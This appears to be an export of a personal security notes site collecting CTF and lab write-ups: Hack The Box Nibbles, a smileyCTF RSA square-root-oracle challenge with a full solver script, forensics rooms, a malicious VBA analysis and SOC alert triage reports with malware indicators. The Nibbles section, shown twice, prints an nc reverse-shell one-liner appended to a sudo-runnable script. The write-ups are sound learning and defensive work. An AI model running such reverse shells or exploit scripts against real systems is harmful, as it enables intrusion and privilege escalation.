       (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Writeups/CTF/SAAS":{"slug":"Writeups/CTF/SAAS","filePath":"Writeups/CTF/SAAS.md","title":"SAAS","links":[],"tags":[],"content":"\nThis is a writeup for the crypto/saas challenge of smileyCTF 2025.\nThe challenge is essentially a crypto challenge where we had to forge a signature for a given message by first reverse-engineering the cryptographic keys from the information provided.\nThe challenge provided the following Python code:\n#!/usr/local/bin/python\nfrom Crypto.Util.number import getPrime as gP\nfrom random import choice, randint\n \np, q = gP(512), gP(512)\nwhile p % 4 != 3:\n    p = gP(512)\n \nwhile q % 4 != 3:\n    q = gP(512)\n \nn = p * q\ne = 0x10001\n \nf = lambda x: ((choice([-1,1]) * pow(x, (p + 1) // 4, p)) * pow(q, -1, p) * q + (choice([-1,1]) * pow(x, (q + 1) // 4, q)) % q * pow(p, -1, q) * p) % n\n \nwhile True:\n    try:\n        l = int(input(&quot;&gt;&gt;&gt; &quot;)) % n\n        print(f(l))\n    except:\n        break\n \nm = randint(0, n - 1)\nprint(f&quot;{m = }&quot;)\ns = int(input(&quot;&gt;&gt;&gt; &quot;)) % n\nif pow(s,e,n) == m:\n    print(open(&quot;flag.txt&quot;, &quot;r&quot;).read())\nelse:\n    print(&quot;Wrong signature!&quot;)\n    exit(1)\nAnalysis of the Cryptosystem/code\n1. Key Generation\nThe script sets up an RSA-like cryptosystem. Learn more about RSA from here.\n\n\np &amp; q: These are two 512-bit primes. A crucial detail is the condition p % 4 == 3. This means the primes must leave a remainder of 3 when divided by 4. Apparently these kind of numbers are special in cryptography and are known as Blum Primes. They make calculating modular square roots easy using the formula x^((p+1)/4) mod p.\n\n\nn: This is the public modulus, the 1024-bit product of p and q. The security of the system relies on the fact that factoring n back into p and q is computationally infeasible.\nThis is because even though n is extremely large, we can get it easily by multiplying p and q. But finding two prime factors (p and q) which when multiplying result to n is very hard because the best we can do is try all combinations of numbers which is not feasible for a number that is 1024 bits which is sth like 10 raised to power 300.\n\n\ne: This is the standard public exponent 65537.\n\n\nThe Public Key is (n, e) but we only know e, and the Private Key is (p, q).\n2. The Goal: Forging a Signature\nThe final part of the code presents the challenge:\nm = randint(0, n - 1)\nprint(f&quot;{m = }&quot;)\ns = int(input(&quot;&gt;&gt;&gt; &quot;)) % n\nif pow(s,e,n) == m:\n    print(open(&quot;flag.txt&quot;, &quot;r&quot;).read())\nThe server gives us a random message(number) m and asks for a signature s. The signature is valid if pow(s,e,n)=m which mathematically equals to s^e ≡ m (mod n). This is the standard verification process for an RSA signature. To create s, we need to calculate the e-th root of m mod n. This is impossible without the private key, which requires factoring n.\n3. The Vulnerability: The Square Root Oracle\nThe most important part of the code is the function f(x) which is provided to us as a service (maybe Saas refers to sq. root as service or sth like that)\nf = lambda x: ((choice([-1,1]) * pow(x, (p + 1) // 4, p)) * ... ) % n\nThis complex-looking function is a Square Root Oracle. Given an input l, it calculates one of its four modular square roots mod n . It does this by:\n\nCalculating a square root modulo p (using the Blum Prime trick).\nCalculating a square root modulo q.\nCombining them using the Chinese Remainder Theorem (CRT) to get a square root modulo n.\n\nThe choice([-1, 1]) ensures it randomly picks one of the four possible roots.\nThe Attack Plan\nThe entire attack focuses on abusing the sq. root service.\nStage 1: Discovering the Modulus n\nThe oracle guarantees that if we send it l, it will return a y such that y² ≡ l (mod n). This means y² - l is a multiple of n.\nWe can exploit this to find n:\n\nAsk the oracle for the square root of 1. Let the result be y1. We now know that M1 = y1² - 1 is a multiple of n.\nAsk the oracle for the square root of 4. Let the result be y2. We now know that M2 = y2² - 4 is also a multiple of n.\nSince M1 and M2 are both multiples of n, their Greatest Common Divisor (GCD) will be n itself (or a large multiple of it, but in practice, it’s n).\n\nWith this, we can recover the full modulus n.\nStage 2: Factoring n\nNow that we have n, we can use the oracle in a different way to factor it. This is a classic cryptographic attack.\n\nChoose a random number x and compute its square l = x² % n. We now know one square root of l (it’s x!).\nSend l to the oracle and get its result, y.\nWe now have two numbers, x and y, where x² ≡ y² (mod n). This means x² - y² ≡ 0 (mod n), which can be factored as (x - y)(x + y) ≡ 0 (mod n).\nThere’s a 50% chance the oracle will return a “non-trivial” root, meaning y is not equal to x or -x (mod n). In this case, the prime factors p and q are split between the terms (x - y) and (x + y).\nThis means that gcd(x - y, n) will reveal one of the prime factors, p. The other is simply q = n // p.\n\nWe can loop this process until we find a non-trivial root, which successfully factors n.\nThe Exploit\nWith p and q found, the rest is standard RSA. You can learn about it from here\n\nCalculate phi(n) = (p - 1) * (q - 1).\nCalculate the private exponent d = pow(e, -1, phi_n).\nReceive the message m from the server.\nForge the signature s = pow(m, d, n).\nSend s to the server to get the flag.\n\nThe following script automates this entire process.\nFinal Solver Script\n#!/usr/bin/env python3\nimport math\nimport random\nimport re\nfrom pwn import *\n \nHOST = &quot;smiley.cat&quot;\nPORT = 39807\n \ndef get_sqrt(proc, val):\n    proc.sendlineafter(b&#039;&gt;&gt;&gt; &#039;, str(val).encode())\n    return int(proc.recvline().strip())\n \np = remote(HOST, PORT)\ne = 0x10001\n \nlog.info(&quot;Phase 0: Discovering the modulus &#039;n&#039;...&quot;)\ny1 = get_sqrt(p, 1)\nM1 = y1**2 - 1\ny2 = get_sqrt(p, 4)\nM2 = y2**2 - 4\nn = math.gcd(M1, M2)\nlog.success(f&quot;Discovered n = {n}&quot;)\n \nlog.info(&quot;Phase 1: Factoring &#039;n&#039;...&quot;)\nwhile True:\n    my_root = random.randint(2, n - 1)\n    l = pow(my_root, 2, n)\n    oracle_root = get_sqrt(p, l)\n    if oracle_root != my_root and oracle_root != n - my_root:\n        log.success(&quot;Found a non-trivial root!&quot;)\n        break\n    log.info(&quot;Trivial root found, trying again...&quot;)\n \np_factor = math.gcd(my_root - oracle_root, n)\nq_factor = n // p_factor\nassert p_factor * q_factor == n\nlog.success(&quot;Factored n successfully!&quot;)\n \nlog.info(&quot;Phase 2: Forging the signature...&quot;)\nphi_n = (p_factor - 1) * (q_factor - 1)\nd = pow(e, -1, phi_n)\n \n# Break the oracle loop and get the message m\np.sendlineafter(b&#039;&gt;&gt;&gt; &#039;, &#039;a&#039;)  # Send a dummy input to get the message\nm_line = p.recvline().decode()\nmatch = re.search(r&#039;m = (\\d+)&#039;, m_line)\nm = int(match.group(1))\nlog.info(f&quot;Received message to sign: m = {m}&quot;)\n \ns = pow(m, d, n)\nlog.info(f&quot;Calculated signature: s = {s}&quot;)\n \np.sendlineafter(b&#039;&gt;&gt;&gt; &#039;, str(s).encode())\nflag = p.recvall().decode().strip()\nlog.success(f&quot;Flag: {flag}&quot;)\nDisclaimer\nI am just learning about Crypto and stuff and this writeup probably has errors. If u find any, please correct me 👍."},"Writeups/CTF/SealedRune":{"slug":"Writeups/CTF/SealedRune","filePath":"Writeups/CTF/SealedRune.md","title":"SealedRune","links":["Assets/9b3a3ae385c610fc39705163a91b642a_MD5.zip"],"tags":[],"content":"\n\nHTB Cyber Apocalypse CTF 2025\n\n\nAttachment: 9b3a3ae385c610fc39705163a91b642a_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.\n\nSolution\n\n\nAnalyzing using DIE we find that its a Linux compiled C Program\n\n\n\nAnalyzing strings, there is a base64 encoded string.\n\n\n\nUsing cyberchef to decode it, it appears to be reversed, reversing it to get the final result as The secret spell is `HTB{run3_m4g1c_r3v34l3d}`.\n\nThat was the solution.\n"},"Writeups/CTF/Windows-Forensics":{"slug":"Writeups/CTF/Windows-Forensics","filePath":"Writeups/CTF/Windows Forensics.md","title":"Windows Forensics","links":[],"tags":[],"content":"THM Room: Investigating Windows\n\ntryhackme.com/room/investigatingwindows\n\nQuestions\n\nWhat’s the version and year of the windows machine?\n→ Windows Server 2016\n\n\nJust went to settings and about PC to find the answer\n\n\nWhich user logged in last?\n→ Administrator\n\n\nWent to Event Viewer, then inside Windows Logs &gt; Security logs. Filter by event ID 4624\n\n\nWhen did John log onto the system last?\n→ 03/02/2019 5:48:32 PM\n\n\nUse cmd to find user details.\n\nnet user John\n\nWhat IP does the system connect to when it first starts?\n→ 10.34.2.3\n\n\nTo see startup task we need to look at HKEY_LOCAL_MACHINE &gt; SOFTWARE &gt; Microsoft &gt; Windows &gt; CurrentVersion &gt; Run, which contains startup instructions. There is following key there which contains required ip address.\n\n\n\nWhat two accounts had administrative privileges (other than the Administrator user)?\n→ Guest, Jenny\n\n\nWe can use following command to see all administrators.\n\nnet localgroup Administrators\n\nWhats the name of the scheduled task that is malicous.\n→ Clean file system\n\n\nOpening Task Scheduler to view scheduled task, we can see following tasks. Looking through them the clean file system is running a suspicious powershell script.\n\n\n\nWhat file was the task trying to run daily?\n→ nc.ps1\n\n\n\n\nWhat port did this file listen locally for?\n→ 1348\n\n\nWhen did Jenny last logon?\n→ never\n\n\n\nUsed following cmd command to see Jenny account details\n\nnet user Jenny\n\nAt what date did the compromise take place?\n→ 03/02/2019\n\n\nLooking back, the Jenny password was changed and the account was also probably created on this date and the malicious scheduled task was created on this day.\n\n\nDuring the compromise, at what time did Windows first assign special privileges to a new logon?\n→ 03/02/2019 4:04:49 PM\n\n\nWe know the compromise date so lets look at security events of  that day. Lets filter the logs further using the Event ID 4672 which logs any special  privileges assigned to a new logon. After filtering we can see following event in which loads of new perms were added to a account.\n\n\n\nWhat tool was used to get Windows passwords?\n→ mimikatz\n\n\nLets look at that TMP folder containing nc.ps1 file to see if it contains any clue. There are several files there. Looking in the txt files for clue we see that mim-out file is output of mimikatz. So, we can conclude that it was the tool used.\n\n\nWhat was the attackers external control and command servers IP?\n→ 76.32.97.132\n\n\nLooking at the files in TMP folder, there was nothing useful. Lets look at hosts file to see they used dns poisoning to redirect legit site to C2. Opening C:\\Windows\\System32\\drivers\\etc\\hosts that seems to be the case. The google.com domain has been redirected to a malicious ip.\n\n\n\nWhat was the extension name of the shell uploaded via the servers website?\n→ .jsp\n\n\nGoing to the C:\\inetpub\\wwwroot directory to see the files uploaded to website. And there are two files with .jsp extension. jsp seems to be some kind of java program for servers The gif file seems inherently harmless even if named shell.\n\n\n\nWhat was the last port the attacker opened?\n→ 1337\n\n\nTo see the opened port, we need to check windows firewall. Looking in Inbound Rules since we are looking for rules for incoming traffic. The first rule straight-up seems sus. Looking its details shows us that 1337 port was opened.\n\n\n\nCheck for DNS poisoning, what site was targeted?\n→ google.com\n\n\nWe already found this while looking for C2 server.\n"},"Writeups/Challenges/Malicious-VBA":{"slug":"Writeups/Challenges/Malicious-VBA","filePath":"Writeups/Challenges/Malicious VBA.md","title":"Malicious VBA","links":["Writeups/Challenges/invoice.vb","Writeups/Challenges/invoice_deobfuscated.vb"],"tags":[],"content":"Background\nOne of the employees has received a suspicious document attached in the invoice email. They sent you the file to investigate. You managed to extract some strings from the VBA Macro document. Can you refer to CyberChef and decode the suspicious strings?\nPlease, open the document in Notepad++ for security reasons unless you are running the file in an isolated sandbox.\nMalicious Macro: invoice.vb\nDeobfuscated file (by: ME): invoice_deobfuscated.vb\nQuestions\n\n\nThe document initiates the download of a payload after the execution, can you tell what website is hosting it?\n→ tinyurl.com/g2z2gh6f\n\n\nWhat is the filename of the payload (include the extension)?\n→ dropped.exe\n\n\nWhat method is it using to establish an HTTP connection between files on the malicious web server?\n→ MSXML2.ServerXMLHTTP\n\n\nWhat user-agent string is it using?\n→ Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\n\nWhat object does the attacker use to be able to read or write text and binary files?\n→ ADODB.Stream\n\n\nWhat is the object the attacker uses for WMI execution? Possibly they are using this to hide the suspicious application running in the background.\n→ winmgmts:\\.\\root\\cimv2:Win32_Process\n\n\nSolution\nFirst step is to deobfuscate the file. Took shit ton of time to and decoded all the strings. They are just put as ascii codes which need to be converted into char and concatinated. Once strings are decoded, the functions are pretty self-explanatory. I have attached the deobfuscated file at the top. After obfuscaton, the answers are right infront of us."},"Writeups/Challenges/Phishing-Email":{"slug":"Writeups/Challenges/Phishing-Email","filePath":"Writeups/Challenges/Phishing Email.md","title":"Phishing Email","links":[],"tags":[],"content":"About\nYour email address has been leaked and you receive an email from Paypal in German. Try to analyze the suspicious email.\nFile location: C:\\Users\\LetsDefend\\Desktop\\Files\\PhishingChallenge.zip\nPassword: infected\nQuestions\n\n\nWhat is the return path of the email?\n→ bounce@rjttznyzjjzydnillquh.designclub.uk.com\n\n\nWhat is the domain name of the url in this mail?\n→ storage.googleapis.com\n\n\nIs the domain mentioned in the previous question suspicious?\n→ yes\n\n\nWhat is the body SHA-256 of the domain?\n→ 13945ecc33afee74ac7f72e1d5bb73050894356c4bf63d02a1a53e76830567f5\n\n\nIs this email a phishing email?\n→ Yes\n\n\nAnalysis\nThe file contained the copy of email which was sent to us. Viewing the source of email, we can uncover some of the answers such as the return path. The email has a button which leads to google storage api. Paypal would not use google storage api. The url is as sus as the email itself is but at least its not some shady website url. Opening the url in browser, it is getting blocked.\nAnalyzing the url, in virustotal, 1 vendors flag as malicious and has -171 community score. We can note the SHA-256 of the domain and conclude that this is a harmful phishing attempt."},"Writeups/Machines/EscapeTwo":{"slug":"Writeups/Machines/EscapeTwo","filePath":"Writeups/Machines/EscapeTwo.md","title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Writeups/Machines/Nibbles":{"slug":"Writeups/Machines/Nibbles","filePath":"Writeups/Machines/Nibbles.md","title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd            (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Writeups/SOC-Alerts/SOC104-1":{"slug":"Writeups/SOC-Alerts/SOC104-1","filePath":"Writeups/SOC Alerts/SOC104 1.md","title":"SOC104 1","links":[],"tags":[],"content":"Alert\n\nEventID: 36\nEvent Time: Dec, 01, 2020, 10:23 AM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 10.15.15.18\nSource Hostname: AdamPRD\nFile Name: Invoice.exe\nFile Hash: f83fb9ce6a83da58b20685c1d7e1e546\nFile Size: 473.00 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/77b2731ff3c7a14b8b962ea387c41293415b3478e73973888851991105777560\nResult: 7 vendors flagged it as trojan. The bundled file was  Maze.exe(e8a091a84dd2ea7ee429135ff48e9f48f7787637ccb79f6c3eb42f34588bc684)\n\nAnyRun\nURL:app.any.run/tasks/83f446df-c888-44b7-9db7-330211161c69\nThe file was a Ransomware. It immediately started modifying files in appdata. It sent tcp connection to 92.63.8.47 ip address only. Running the ip address through abuseipdb, it has been associated with maze ransomware.\nC2 Access\nChecking if the C2 server was accessed through logs. Unfortunately, there is an entry of the C2 server in logs. It was accessed by 10.15.15.18 which belongs to our victim system few minutes after the file was downloaded. This means our endpoint has been compromised but the malicious file has not yet spread.\nEndpoint\nThe endpoint has been contained.\nConclusion\nThe alert is truepositive. The malicious file was a ransomware and the endpoint is infected. Logs indicated that the C2 server was accessed by the victim host only so the malware has not yet propagated through the network. The host has been contained and needs further action."},"Writeups/SOC-Alerts/SOC104-2":{"slug":"Writeups/SOC-Alerts/SOC104-2","filePath":"Writeups/SOC Alerts/SOC104 2.md","title":"SOC104 2","links":[],"tags":[],"content":"Alert\n\nEventID: 84\nEvent Time: Mar, 21, 2021, 01:04 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nFile Name: winrar600.exe\nFile Hash: c74862e16bcc2b0e02cadb7ab14e3cd6\nFile Size: 2.95 Mb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/aff4bb9b15bccff67a112a7857d28d3f2f436e2e42f11be14930fe496269d573/detection\nResult:\n\nSAFE\nOnly 1 vendor flagged it as malicious\nNo malicious domains\nValid signature\nAuthentic winrar executable\n\n\n\nAnyRun\n\nURL:app.any.run/tasks/0786f88e-c614-48c1-bc16-6270455ed826\nResult:\n\nDetects as 100/100 malicious.\nOn looking at indicators, they seem reasonable for the installer.\nThere are no malicious activities.\nThe detection system was thrown off likely because of nature of executable.\n\n\n\nEndpoint\nNothing sus.\nConclusion\nThe executable is SAFE and this is a falsepositive."},"Writeups/SOC-Alerts/SOC104":{"slug":"Writeups/SOC-Alerts/SOC104","filePath":"Writeups/SOC Alerts/SOC104.md","title":"SOC104","links":[],"tags":[],"content":"ALERT\n\nEventID: 14\nEvent Time: Sep, 15, 2020, 09:02 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.82\nSource Hostname: JohnComputer\nFile Name: googleupdate.exe\nFile Hash: 0bca3f16dd527b4150648ec1e36cb22a\nFile Size: 152.45 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\n\nVirustotal: Clean\nAnyrun: Clean\n\nResult\nThe alert is false positive and was caused by download of google update. The file was scanned in virustotal and ran through anyrun and both platforms confirmed that it was not malicious. No further action is required."},"Writeups/SOC-Alerts/SOC109":{"slug":"Writeups/SOC-Alerts/SOC109","filePath":"Writeups/SOC Alerts/SOC109.md","title":"SOC109","links":[],"tags":[],"content":"Alert\n\nEventID: 85\nEvent Time: Mar, 22, 2021, 09:06 PM\nRule: SOC109 - Emotet Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.45\nSource Hostname: RichardPRD\nFile Name: 1word.doc\nFile Hash: 349d13ca99ab03869548d75b99e5a1d0\nFile Size: 188.95 Kb\nDevice Action: Cleaned\nFile (Password:infected): Download\n\nAnalysis\nThe file was extracted and ran through virustotal &amp; anyrun:\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/d34849e1c97f9e615b3a9b800ca1f11ed04a92b1014f55aa0158e3fffc22d78f\nReport:\n\nMalicious 48 vendors reported\nUses macro to drop malware into the system\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/80495aaf-6841-40c7-846e-481546ca8299\nReport:\n\nMalicious urls:\n\ngrml.net (85.214.109.143)\ngetming.com (168.206.6.156)\nevilnerd.org (81.169.145.160)\n\n\n100/100 Malicious score\nDrops Malware\n\n\n\nLog Analysis\nThere is no record of host accessing any of the malicious urls found during malware analysis. We can hence conclude that the malware was not executed.\nReport\nThe file “1word.doc” was confirmed to be malicious, utilizing macros to drop malware into the system. Multiple security vendors identified the file as a threat. However, the analysis revealed that the host did not access any of the malicious URLs associated with the malware, indicating that the malware was not executed. The threat has been neutralized, and the device action successfully cleaned it."},"Writeups/SOC-Alerts/SOC114":{"slug":"Writeups/SOC-Alerts/SOC114","filePath":"Writeups/SOC Alerts/SOC114.md","title":"SOC114","links":[],"tags":[],"content":"Alert\n\nEventID : 45\nEvent Time : Jan, 31, 2021, 03:48 PM\nRule : SOC114 - Malicious Attachment Detected - Phishing Alert\nLevel : Security Analyst\nSMTP Address : 49.234.43.39\nSource Address : accounting@cmail.carleton.ca\nDestination Address : richard@letsdefend.io\nE-mail Subject : Invoice\nDevice Action : Allowed\n\nAction\nAttachment\nc9ad9506bcccfaa987ff9fc11b91698d was present is the email whose password was infected. In Virustotal 34/60 vendors flagged it as trojan. The file contained an spreadsheet.\nWas it opened?\nThe email is harmful and was successfully delivered. Deleted it immediately.\nChecking logs of that day, right after email was delivered following url was invoked andaluciabeach.net/image/network.exe which is fagged as malicious by 13 vendors in virustotal. The host is now infected. On further investigation, there was juicypotato.exe running on the host. The host was contained immediately."},"Writeups/SOC-Alerts/SOC119":{"slug":"Writeups/SOC-Alerts/SOC119","filePath":"Writeups/SOC Alerts/SOC119.md","title":"SOC119","links":[],"tags":[],"content":"Alert\n\nEventID: 83\nEvent Time: Mar, 21, 2021, 01:02 PM\nRule: SOC119 - Proxy - Malicious Executable File Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nDestination Address: 51.195.68.163\nDestination Hostname: win-rar.com\nUsername: Susie\nRequest URL: www.win-rar.com/postdownload.html\nUser Agent: Chrome - Windows\nDevice Action: Allowed\n\nAnalysis\nDestinaiton Host\nThe destinaiton win-rar.com is a legit website of winrar which serves the app downloads. Running ip through abuseipdp, the ip address belongs to the site and there is no spoofing.\nURL\nThe url drops an executable “WinRar.exe” (a911bbfab70c7545307b9dbcb06273d899ca03aad928f0b66d55b41c25cb4f14). Running the executable through Virustotal, the file is clean and is legit winrar installer.\nConclusion\nThe alert was triggered by a legitimate download of the WinRAR installer from the official website. The executable file is clean and safe, as confirmed by VirusTotal. No further action is required."},"Writeups/SOC-Alerts/SOC120":{"slug":"Writeups/SOC-Alerts/SOC120","filePath":"Writeups/SOC Alerts/SOC120.md","title":"SOC120","links":[],"tags":[],"content":"Alert\n\nEventID : 52\nEvent Time : Feb, 07, 2021, 04:24 AM\nRule : SOC120 - Phishing Mail Detected - Internal to Internal\nLevel : Security Analyst\nSMTP Address : 172.16.20.3\nSource Address : john@letsdefend.io\nDestination Address : susie@letsdefend.io\nE-mail Subject : Meeting\nDevice Action : Allowed\n\nAnalysis\nStuyding the 172.16.20.3, it happens to be Exchange Server in our network. There seems to be no trace of the Exchange Server getting hacked. This email might have been spoofed or sth.\nAnalyzing the email, the email seems legit, there is no attachments or url and contains valid subject.\nAnalyzing logs, there is no communication with any suspicious addresses.\nReport\nThe alert is False Positive. The email contain no harmful attachment or url. Hosts seem normal. The cause of false positive needs further investigation."},"Writeups/SOC-Alerts/SOC138":{"slug":"Writeups/SOC-Alerts/SOC138","filePath":"Writeups/SOC Alerts/SOC138.md","title":"SOC138","links":[],"tags":[],"content":"Alert\n\nEventID: 77\nEvent Time: Mar, 13, 2021, 08:20 PM\nRule: SOC138 - Detected Suspicious Xls File\nLevel: Security Analyst\nSource Address: 172.16.17.56\nSource Hostname: Sofia\nFile Name: ORDER SHEET &amp; SPEC.xlsm\nFile Hash: 7ccf88c0bbe3b29bf19d877c4596a8d4\nFile Size: 2.66 Mb\nDevice Action: Allowed\nFile: Download  (Password:infected)\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL:www.virustotal.com/gui/file/7bcd31bd41686c32663c7cabf42b18c50399e3b3b4533fc2ff002d9f2e058813\nReport:\n\n***Malicious\nCve-2017-11882\nUses heavily obfuscated code to execute commands and drop files.\nConnections:\n\nTCP 204.79.197.203:443\nTCP 209.85.200.94:443\nTCP 177.53.143.89:443 (multiwaretecnologia.com.br)\nTCP 52.114.76.35:443\nTCP 172.217.17.142:443 (drive.google.com)\nTCP 185.157.161.61:52360 (wealthybillionaire.ddns.net)\n\n\n\n\n\n2. AnyRun\n\nURL: 